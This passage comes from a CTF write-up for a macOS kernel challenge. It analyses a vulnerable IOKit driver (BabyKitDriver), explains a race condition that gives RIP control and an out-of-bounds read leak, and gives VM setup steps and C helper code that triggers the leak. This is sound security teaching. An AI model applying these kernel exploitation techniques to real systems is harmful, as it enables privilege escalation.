</span></span><span class="line"><span class="cl">  <span class="nf">IOLog</span><span class="p">(</span><span class="s">&#34;BabyKitDriverUserClient::baby_read</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">IOLog</span><span class="p">(</span><span class="s">&#34;version:%lld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">v4</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">scalarInput</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">&gt;</span> <span class="o">**</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">**</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">v4</span> <span class="o">=</span> <span class="o">**</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">**</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">memset</span><span class="p">(</span><span class="n">v10</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">v10</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">**</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">,</span> <span class="kr">__int64</span><span class="p">,</span> <span class="n">_QWORD</span><span class="p">))(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">))(</span>
</span></span><span class="line"><span class="cl">        <span class="n">v10</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x10LL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="o">**</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">**</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">copyout</span><span class="p">(</span><span class="n">v10</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">scalarInput</span><span class="p">,</span> <span class="p">((</span><span class="n">_WORD</span><span class="p">)</span><span class="n">v4</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">);</span><span class="c1">// 1st arg
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">memset</span><span class="p">(</span><span class="n">__b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="o">**</span><span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">***</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">,</span> <span class="kr">__int64</span><span class="p">))(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">))(</span><span class="n">__b</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">copyout</span><span class="p">(</span><span class="n">__b</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">scalarInput</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This function will check, whether the <code>driver</code> already allocated a heap chunk or not. If it is not null, it will copy the <code>chunks</code> contents to the userland address that we passed as the first argument. Depends on our previous input in <code>baby_leaveMessage</code>, if the <code>v7+0x98</code> (which is our first argument input in <code>baby_leaveMessage</code>) is not zero, we can specify our own size, else, it will be fixed at <code>0x100</code>.</p>
<p>Back to the race condition that we can triggered, if let say we caused inconsistent state where <code>v6</code> is not zero, but <code>baby_leaveMessage(0,,)</code> overwrite the <code>chunk+0x8</code>, we can basically have RIP control, because this LOC,</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">      <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">**</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">,</span> <span class="kr">__int64</span><span class="p">,</span> <span class="n">_QWORD</span><span class="p">))(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">))(</span>
</span></span><span class="line"><span class="cl">        <span class="n">v10</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x10LL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="o">**</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">**</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>will allow us to control the function that is called in here.</p>
<p>Another thing is we can see that there is one bug in this function. If <code>v6</code> is not zero and we specify <code>0</code> as our size, the <code>copyout</code> will copy <code>(0 - 1) &amp; 0xFFF</code> size to our userland address. This means we have OOB Read, because our <code>chunk</code> size is only <code>0x300</code>. We might get some good leaks from it.</p>
<p>Now that we know the bug, let&rsquo;s start to craft our solution.</p>
<h3 id="solution">Solution</h3>
<p>Before crafting our solution, we need to setup debug environment first because this is a macOS kernel pwn challenge.</p>
<h4 id="setup-debug-environment">Setup Debug Environment</h4>
<p>We use <a href="https://github.com/kholia/OSX-KVM" target="_blank" rel="noopener noreffer ">OSX-KVM</a> as our macOS VM. Below is the step-by-step that we need to do so that we can successfully run the <code>OSX-KVM</code> in our local:</p>
<ul>
<li>Do everything that they mentioned in <a href="https://github.com/kholia/OSX-KVM" target="_blank" rel="noopener noreffer ">Installation Preparaion</a>.
<ul>
<li>During running the <code>fetch-macOS-v2.py</code>, we choose the <code>Ventura</code> option. However, the <code>Ventura</code> version that is fetched here is not the same version that is used in this challenge. We will need to do extra step later.</li>
<li>For the virtual HDD image size, <code>64G</code> is enough.</li>
</ul>
</li>
<li>Now, we need to follow the <a href="https://github.com/kholia/OSX-KVM/blob/master/run_offline.md" target="_blank" rel="noopener noreffer ">run_offline</a> instructions, because we want to specifically install the <code>13.6.1</code> version.
<ul>
<li>Make sure that you download the <code>13.6.1</code> installer.</li>
<li>Make sure that during formatting the virtual HDD via the GUI <code>Disk Utility</code>:
<ul>
<li>Named it as <code>macOS</code>.</li>
<li>Use <code>APFS</code> filesystem.
<ul>
<li>The documentation mentioned that it isn&rsquo;t recommended to use <code>APFS</code>, but the VM won&rsquo;t work if we didn&rsquo;t use <code>APFS</code>.</li>
<li>This is a very important step.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>When you successfully installed the VM, some extra steps that we did to make our debugging smoother:</p>
<ul>
<li>We enabled the remote login, so that we can interact via <code>SSH</code> and send/receive files via <code>SCP</code>.
<ul>
<li>After enabling the remote login, we can simply use port <code>2222</code> to access the VM from the host.</li>
</ul>
</li>
<li>We copied the <code>kernel</code> image used in this OS, which can be found in the <code>/System/Library/Kernels/kernel</code>.</li>
<li>Type <code>gcc</code> in terminal. You will be prompted to install some tools, and just press yes to it, so that we can compile our exploit in this VM.</li>
<li>Download the <code>kext</code> challenge, and install it with <code>sudo kextload BabyKitDriver.kext</code>.
<ul>
<li>We need to do this everytime we crashed.</li>
<li>During the first time we do this, we will need to go to System Preferences to allow it to be installed (which will reboot the VM as well).</li>
</ul>
</li>
</ul>
<figure><a class="lightgallery" href="https://i.imgur.com/MamOEsi.png" title="https://i.imgur.com/MamOEsi.png" data-thumbnail="https://i.imgur.com/MamOEsi.png" data-sub-html="<h2>VM is ready</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/MamOEsi.png"
            data-srcset="https://i.imgur.com/MamOEsi.png, https://i.imgur.com/MamOEsi.png 1.5x, https://i.imgur.com/MamOEsi.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/MamOEsi.png" />
    </a><figcaption class="image-caption">VM is ready</figcaption>
    </figure>
<p>Now that we have running VM with driver of the challenge installed, and we can start crafting our exploit now.</p>
<h4 id="getting-leak">Getting Leak</h4>
<p>Let&rsquo;s start by setting up some helpers to interact with the IOKit driver. Below is the helper that we made, mostly copying from this <a href="https://github.com/TrungNguyen1909/writeups/blob/master/DEFCON26-Qual/iPwnKit/exploit.c" target="_blank" rel="noopener noreffer ">writeup</a> and using ChatGPT :D.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sched.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;IOKit/IOKitLib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;CoreFoundation/CoreFoundation.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;mach/mach.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#define kBabyRead 	    0
</span></span></span><span class="line"><span class="cl"><span class="cp">#define kLeaveMessage 	1
</span></span></span><span class="line"><span class="cl"><span class="cp">#define kIOKitClassName &#34;BabyKitDriver&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp">#define KERNEL_BASE_NO_SLID 0xFFFFFF8000100000ULL
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="n">kbase</span><span class="p">,</span> <span class="n">slide</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">io_connect_t</span> <span class="n">connection</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">ropChain</span><span class="p">[</span><span class="mh">0x200</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">loop_end</span> <span class="o">=</span> <span class="mi">100000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// TODO: define gadgets and addresses that we need for ROP Chain
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">print_data</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;-----&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">fmt_str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">/</span> <span class="mi">8</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">fmt_str</span> <span class="o">=</span> <span class="s">&#34;0x%04x: 0x%016lx&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="n">fmt_str</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">fmt_str</span> <span class="o">=</span> <span class="s">&#34; 0x%016lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="n">fmt_str</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;-----&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="nf">GetKextAddr</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">fp</span> <span class="o">=</span> <span class="nf">popen</span><span class="p">(</span><span class="s">&#34;kextstat 2&gt;/dev/null | grep BabyKitDriver | awk &#39;{print $3}&#39;&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to get KEXT address!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nf">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kt">uint64_t</span> <span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="nf">strtoul</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">baby_read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">args</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="n">size</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">  <span class="nf">IOConnectCallScalarMethod</span><span class="p">(</span><span class="n">connection</span><span class="p">,</span><span class="n">kBabyRead</span><span class="p">,(</span><span class="k">const</span> <span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">args</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">leave_message</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">msg_type</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">args</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="n">msg_type</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="n">size</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">  <span class="nf">IOConnectCallScalarMethod</span><span class="p">(</span><span class="n">connection</span><span class="p">,</span><span class="n">kLeaveMessage</span><span class="p">,(</span><span class="k">const</span> <span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">args</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">babyKitConnect</span><span class="p">(</span><span class="kt">io_connect_t</span> <span class="o">*</span><span class="n">connection</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">kern_return_t</span>   <span class="n">kr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">io_service_t</span>    <span class="n">serviceObject</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">io_iterator_t</span>   <span class="n">iterator</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">CFDictionaryRef</span> <span class="n">classToMatch</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">classToMatch</span> <span class="o">=</span> <span class="nf">IOServiceMatching</span><span class="p">(</span><span class="n">kIOKitClassName</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">classToMatch</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;IOServiceMatching returned a NULL dictionary</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">serviceObject</span> <span class="o">=</span> <span class="nf">IOServiceGetMatchingService</span><span class="p">(</span><span class="n">kIOMainPortDefault</span><span class="p">,</span> <span class="n">classToMatch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">MACH_PORT_VALID</span><span class="p">(</span><span class="n">serviceObject</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;IOServiceGetMatchingService failed</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">kr</span> <span class="o">=</span> <span class="nf">IOServiceOpen</span><span class="p">(</span><span class="n">serviceObject</span><span class="p">,</span> <span class="nf">mach_task_self</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">connection</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">IOObjectRelease</span><span class="p">(</span><span class="n">serviceObject</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;IOServiceOpen returned %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now that we have defined our helper, let&rsquo;s start by checking what OOB data that we can get from the <code>baby_read</code> bug.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">    Get leak with the first bug (setting size to 0 will trigger OOB read)
</span></span></span><span class="line"><span class="cl"><span class="cm">  */</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="nf">leave_message</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="nf">baby_read</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">print_data</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
